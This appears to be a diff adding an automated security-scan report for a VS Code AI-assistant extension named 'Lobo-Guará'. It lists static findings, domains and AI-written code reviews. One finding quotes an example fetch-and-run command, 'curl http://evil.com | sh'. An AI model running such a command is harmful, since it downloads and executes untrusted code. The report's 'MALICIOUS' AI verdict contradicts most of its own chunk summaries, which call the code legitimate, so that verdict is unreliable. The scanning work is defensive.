@@ -1,0 +1,307 @@
+{
+  "extension_id": "LoboGuaranet.loboguara-vscode",
+  "display_name": "Lobo-Guar\u00e1",
+  "version": "0.1.0",
+  "publisher": {
+    "name": "LoboGuaranet",
+    "verified": false
+  },
+  "vsix_sha256": "d56d12ffd747f035f13265384b4754692108e45248091eae7db79df4e1109a31",
+  "verdict": "SUSPICIOUS",
+  "confirmation_basis": [
+    "composite_score",
+    "critical_static_finding"
+  ],
+  "confidence": 0.6,
+  "scores": {
+    "composite": 0.6599999999999999,
+    "ai_vibe": 0.85,
+    "static": 1.0,
+    "behavioral": 0.0,
+    "trust_signal": 0.75,
+    "campaign": 0.0
+  },
+  "findings": {
+    "critical": [
+      {
+        "check": "vscode_credential_theft",
+        "severity": "CRITICAL",
+        "description": "Reading from VSCode SecretStorage API",
+        "file": "extension/out/auth.js",
+        "line": 56,
+        "snippet": "context.secrets.get("
+      }
+    ],
+    "high": [
+      {
+        "check": "RISKY_API_CALL",
+        "severity": "HIGH",
+        "description": "Found 'child_process' pattern",
+        "file": "extension/out/tools.js",
+        "line": 39,
+        "snippet": "const child_process_1 = require(\"child_process\");"
+      },
+      {
+        "check": "RISKY_API_CALL",
+        "severity": "HIGH",
+        "description": "Found 'require(\"child_process\")' pattern",
+        "file": "extension/out/tools.js",
+        "line": 39,
+        "snippet": "const child_process_1 = require(\"child_process\");"
+      },
+      {
+        "check": "RISKY_API_CALL",
+        "severity": "HIGH",
+        "description": "Found 'child_process' pattern",
+        "file": "extension/out/tools.js",
+        "line": 197,
+        "snippet": "(0, child_process_1.exec)(command, { cwd: workspaceRoot(), timeout: 60000, maxBuffer: 5 * 1024 * 1024 }, (err, stdout, stderr) => {"
+      },
+      {
+        "check": "command_execution",
+        "severity": "HIGH",
+        "description": "Direct command / shell execution",
+        "file": "extension/out/tools.js",
+        "line": 39,
+        "snippet": "require(\"child_process\")"
+      },
+      {
+        "check": "persistence_evasion",
+        "severity": "HIGH",
+        "description": "Setting file hidden attribute",
+        "file": "extension/media/chat.js",
+        "line": 205,
+        "snippet": ".hidden"
+      },
+      {
+        "check": "persistence_evasion",
+        "severity": "HIGH",
+        "description": "Setting file hidden attribute",
+        "file": "extension/media/chat.js",
+        "line": 225,
+        "snippet": ".hidden"
+      },
+      {
+        "check": "persistence_evasion",
+        "severity": "HIGH",
+        "description": "Setting file hidden attribute",
+        "file": "extension/media/chat.js",
+        "line": 225,
+        "snippet": ".hidden"
+      },
+      {
+        "check": "persistence_evasion",
+        "severity": "HIGH",
+        "description": "Setting file hidden attribute",
+        "file": "extension/media/chat.js",
+        "line": 229,
+        "snippet": ".hidden"
+      },
+      {
+        "check": "persistence_evasion",
+        "severity": "HIGH",
+        "description": "Setting file hidden attribute",
+        "file": "extension/media/chat.js",
+        "line": 230,
+        "snippet": ".hidden"
+      }
+    ],
+    "total": 18
+  },
+  "extracted_references": [
+    {
+      "type": "domain",
+      "value": "loboguara.net",
+      "source_file": "extension/package.json",
+      "line": 13,
+      "context": "\"homepage\": \"https://loboguara.net\",",
+      "vt_detections": 0,
+      "reputation": "unknown"
+    },
+    {
+      "type": "domain",
+      "value": "api.loboguara.net",
+      "source_file": "extension/package.json",
+      "line": 22,
+      "context": "\"default\": \"https://api.loboguara.net/api\",",
+      "vt_detections": 0,
+      "reputation": "unknown"
+    },
+    {
+      "type": "domain",
+      "value": "app.loboguara.net",
+      "source_file": "extension/package.json",
+      "line": 27,
+      "context": "\"default\": \"https://app.loboguara.net\",",
+      "vt_detections": 0,
+      "reputation": "unknown"
+    }
+  ],
+  "extracted_references_notes": {
+    "withheld_dependency_metadata": 0,
+    "truncated": 0,
+    "what_this_is": "Domains, URLs and filenames found in the package text. NOT confirmed attacker infrastructure and NOT safe to auto-blocklist -- a URL in a code comment appears here too. Use it as a starting point for analysis, and check vt_detections/reputation before acting.",
+    "rule": "References extracted from node_modules are excluded: they describe a dependency, not this extension. Deduplicated on (type, value)."
+  },
+  "ioc_enrichment": [],
+  "shared_infrastructure": {},
+  "ai_analysis": {
+    "verdict": "MALICIOUS",
+    "risk_score": 0.85,
+    "confidence": 0.95,
+    "blocks_parsed": 5,
+    "blocks_seen": 5,
+    "summaries": [
+      {
+        "target": "extension/out/tools.js (chunk 1/3)",
+        "summary": "The code appears to be a legitimate implementation of an AI coding assistant toolset. It defines standard file manipulation tools (read, write, list, replace) consistent with the advertised 'agent' functionality. The use of `child_process` is expected for such tools to execute system commands. The domains `loboguara.net` are unknown but consistent with the extension's branding ('Lobo-Guar\u00e1'). No obfuscation, credential harvesting, or exfiltration patterns were detected in this chunk. The static rule hit for `child_process` is a false positive in this context."
+      },
+      {
+        "target": "extension/out/tools.js (chunk 2/3)",
+        "summary": "This extension is highly suspicious and likely malicious or extremely dangerous. It implements an AI agent with the ability to execute arbitrary shell commands (run_command) and read/write files. While it includes a confirmation dialog, the 'autoApprove' setting and the nature of AI agents (susceptible to prompt injection) make this a critical security risk. The capability to execute shell commands is a major disconnect for a 'chat' extension and provides a direct path to system compromise. The use of unknown domains (loboguara.net) for API calls further increases the risk of data exfiltration or remote code execution via the backend."
+      },
+      {
+        "target": "extension/out/tools.js (chunk 3/3)",
+        "summary": "This extension is an AI-powered coding assistant that allows the AI model to edit files and execute shell commands within the workspace. The use of `child_process.exec` is a high-risk feature, but it is consistent with the extension's stated purpose of being an 'agentic' AI tool (similar to Cursor or Copilot Workspace). The code includes user confirmation prompts for sensitive actions, which mitigates some risk but does not eliminate the threat of prompt injection or model hallucination leading to malicious command execution. The network calls to `loboguara.net` are expected for an AI service but should be monitored for data exfiltration. Overall, the code appears to be a legitimate (if risky) implementation of an AI agent, rather than a traditional malware payload, but the capability for arbitrary command execution warrants a SUSPICIOUS verdict due to the inherent security risks of such features."
+      },
+      {
+        "target": "extension/out/auth.js (chunk 1/2)",
+        "summary": "The code is a standard authentication manager for a VS Code extension that integrates with an external AI service ('Lobo-Guar\u00e1'). It implements an OAuth-like flow using the VS Code URI handler and stores the resulting token in the secure SecretStorage API. The static scanner's critical finding is a false positive for standard credential storage. The domains (loboguara.net) are consistent with the extension's branding. There are no signs of malicious intent, data exfiltration, or obfuscation in this file."
+      },
+      {
+        "target": "extension/out/auth.js (chunk 2/2)",
+        "summary": "The code is a standard OAuth implementation for a VS Code extension. It correctly uses the `vscode` SecretStorage API to persist authentication tokens and validates the OAuth `state` parameter to prevent CSRF attacks. The static rule hit for credential theft is a false positive, as the code is managing its own session token, not harvesting user secrets. The network endpoints align with the extension's advertised functionality as a client for the 'Lobo-Guar\u00e1' AI service. No malicious behavior, obfuscation, or capability disconnects were found."
+      }
+    ],
+    "findings": [
+      {
+        "severity": "LOW",
+        "category": "STATIC_RULE_FALSE_POSITIVE",
+        "description": "The static scanner flagged `require('child_process')` as a high-risk indicator. However, in the context of an AI coding assistant extension (similar to Cursor or Copilot), importing `child_process` is a standard and expected capability for executing terminal commands or running linters/builds as part of the 'agent' functionality. No malicious execution logic (e.g., reverse shells, obfuscated commands) is visible in this chunk, only the import and tool schema definitions.",
+        "code_reference": "const child_process_1 = require(\"child_process\");",
+        "line_hint": 39,
+        "target": "extension/out/tools.js (chunk 1/3)"
+      },
+      {
+        "severity": "LOW",
+        "category": "BEHAVIORAL_ALIGNMENT",
+        "description": "The extension activates on `onStartupFinished`. While this is more aggressive than necessary for a chat extension (which could activate on command or view), it is a common pattern for extensions that want to ensure their status bar items or background services are ready immediately. It is not inherently malicious, but worth noting for performance impact.",
+        "code_reference": null,
+        "line_hint": null,
+        "target": "extension/out/tools.js (chunk 1/3)"
+      },
+      {
+        "severity": "CRITICAL",
+        "category": "ARBITRARY_COMMAND_EXECUTION",
+        "description": "The extension implements a 'run_command' tool that executes arbitrary shell commands via child_process. While it uses a confirmation dialog, the 'autoApprove' setting allows bypassing this check. In the context of an AI agent, this allows the LLM (or a prompt injection attack) to execute arbitrary system commands, leading to full system compromise.",
+        "code_reference": "case 'run_command': return await runCommand(input.command);",
+        "line_hint": 65,
+        "target": "extension/out/tools.js (chunk 2/3)"
+      },
+      {
+        "severity": "HIGH",
+        "category": "CAPABILITY_DISCONNECT",
+        "description": "The extension is described as a chat interface for Claude ('Lobo-Guar\u00e1'). However, it includes a full agent toolset (read_file, write_file, run_command) that grants the AI direct filesystem and shell access. This is a significant capability disconnect for a standard chat extension and poses a severe supply-chain risk if the backend or model is compromised.",
+        "code_reference": "tools: [ { name: 'run_command', ... } ]",
+        "line_hint": 1,
+        "target": "extension/out/tools.js (chunk 2/3)"
+      },
+      {
+        "severity": "MEDIUM",
+        "category": "UNSAFE_PATH_RESOLUTION",
+        "description": "The resolveInside function attempts to prevent path traversal but relies on string prefix matching (p.startsWith(root + path.sep)). This can be bypassed on some systems or with specific path manipulations, potentially allowing access to files outside the workspace.",
+        "code_reference": "if (p !== root && !p.startsWith(root + path.sep))",
+        "line_hint": 28,
+        "target": "extension/out/tools.js (chunk 2/3)"
+      },
+      {
+        "severity": "MEDIUM",
+        "category": "DATA_EXFILTRATION_RISK",
+        "description": "The extension reads file contents (readFile) and sends them to the backend (api.loboguara.net). If the backend is malicious or compromised, this allows exfiltration of sensitive workspace files. The 'run_command' tool exacerbates this by allowing execution of commands that could read sensitive system files.",
+        "code_reference": "const bytes = await vscode.workspace.fs.readFile(uri);",
+        "line_hint": 75,
+        "target": "extension/out/tools.js (chunk 2/3)"
+      },
+      {
+        "severity": "HIGH",
+        "category": "ARBITRARY_COMMAND_EXECUTION",
+        "description": "The extension implements a `runCommand` function that executes arbitrary shell commands via `child_process.exec`. While it prompts the user for confirmation, this capability is highly dangerous if the AI model (which generates the commands) is compromised, hallucinates, or is manipulated via prompt injection. The command is executed in the workspace root with a 60-second timeout. This is a core feature of an 'agentic' AI tool, but it represents a significant attack surface for supply-chain or model-level attacks.",
+        "code_reference": "function runCommand(command) { ... (0, child_process_1.exec)(command, ...",
+        "line_hint": "39",
+        "target": "extension/out/tools.js (chunk 3/3)"
+      },
+      {
+        "severity": "MEDIUM",
+        "category": "NETWORK_EXFILTRATION_RISK",
+        "description": "The extension communicates with external domains `api.loboguara.net` and `app.loboguara.net`. As an AI chat extension, sending code context or file contents to a remote API is expected behavior. However, without seeing the full implementation of the API client, there is a risk that sensitive workspace data could be exfiltrated if the backend is malicious or compromised. The domains have unknown reputation.",
+        "code_reference": "domain: api.loboguara.net, app.loboguara.net",
+        "line_hint": null,
+        "target": "extension/out/tools.js (chunk 3/3)"
+      },
+      {
+        "severity": "LOW",
+        "category": "USER_CONFIRMATION_BYPASS_RISK",
+        "description": "The `runCommand` and file editing functions rely on a `confirm` dialog. If the AI model is manipulated to generate commands that appear benign but are actually malicious (e.g., `curl http://evil.com | sh`), the user might approve them without fully understanding the risk. This is a common weakness in AI-agent extensions.",
+        "code_reference": "confirm(`O Lobo-Guar\u00e1 quer rodar o comando:\\n\\n${command}`)",
+        "line_hint": "42",
+        "target": "extension/out/tools.js (chunk 3/3)"
+      },
+      {
+        "severity": "LOW",
+        "category": "FALSE_POSITIVE",
+        "description": "The static scanner flagged 'vscode_credential_theft' due to `context.secrets.get()`. This is a false positive. The code uses the standard VS Code SecretStorage API to retrieve a token for the extension's own OAuth login flow, which is the intended and secure way to handle credentials in VS Code extensions. It is not stealing credentials from other extensions or the system.",
+        "code_reference": "return this.context.secrets.get(TOKEN_KEY);",
+        "line_hint": 56,
+        "target": "extension/out/auth.js (chunk 1/2)"
+      },
+      {
+        "severity": "LOW",
+        "category": "BEHAVIORAL_MISMATCH",
+        "description": "The extension activates on 'onStartupFinished'. While common for chat extensions to be ready immediately, it is slightly broader than necessary if the user only wants to use it on demand. However, given the 'Chat' category and the need for a status bar item, this is a common pattern and not inherently malicious, just a minor design choice.",
+        "code_reference": null,
+        "line_hint": null,
+        "target": "extension/out/auth.js (chunk 1/2)"
+      },
+      {
+        "severity": "LOW",
+        "category": "FALSE_POSITIVE",
+        "description": "The static scanner flagged `context.secrets.get` as credential theft. However, the code shows standard usage of the VS Code SecretStorage API to manage the extension's own OAuth token (storing, deleting, and validating state). This is the intended and secure way for extensions to handle user credentials, not theft.",
+        "code_reference": "await this.context.secrets.delete(TOKEN_KEY); ... await this.context.secrets.store(TOKEN_KEY, token);",
+        "line_hint": "56",
+        "target": "extension/out/auth.js (chunk 2/2)"
+      },
+      {
+        "severity": "LOW",
+        "category": "NETWORK_ENDPOINT",
+        "description": "The extension communicates with `api.loboguara.net` and `app.loboguara.net`. While these domains have unknown reputation, they are consistent with the extension's stated purpose (an AI chat client for a specific service called 'Lobo-Guar\u00e1'). No exfiltration of unrelated system data is observed in this chunk.",
+        "code_reference": "package.json indicators",
+        "line_hint": null,
+        "target": "extension/out/auth.js (chunk 2/2)"
+      }
+    ],
+    "findings_truncated": 0
+  },
+  "ai_summary": "The code appears to be a legitimate implementation of an AI coding assistant toolset. It defines standard file manipulation tools (read, write, list, replace) consistent with the advertised 'agent' functionality. The use of `child_process` is expected for such tools to execute system commands. The domains `loboguara.net` are unknown but consistent with the extension's branding ('Lobo-Guar\u00e1'). No obfuscation, credential harvesting, or exfiltration patterns were detected in this chunk. The static rule hit for `child_process` is a false positive in this context.",
+  "escalation_reasons": [
+    "1 CRITICAL findings",
+    "9 HIGH findings",
+    "AI verdict: MALICIOUS"
+  ],
+  "virustotal": {
+    "malicious": 0,
+    "total_engines": 0,
+    "known_malicious": false
+  },
+  "marketplace": {
+    "install_count": 0,
+    "published_date": "2026-08-17T22:37:10.98Z",
+    "removed_by_microsoft": false,
+    "removal_type": null
+  },
+  "analysis_coverage": {
+    "partial": false,
+    "excluded_phases": [],
+    "ai_phase_ran": true
+  },
+  "scanned_at": "2026-08-17T23:12:27.184423+00:00Z"
+}
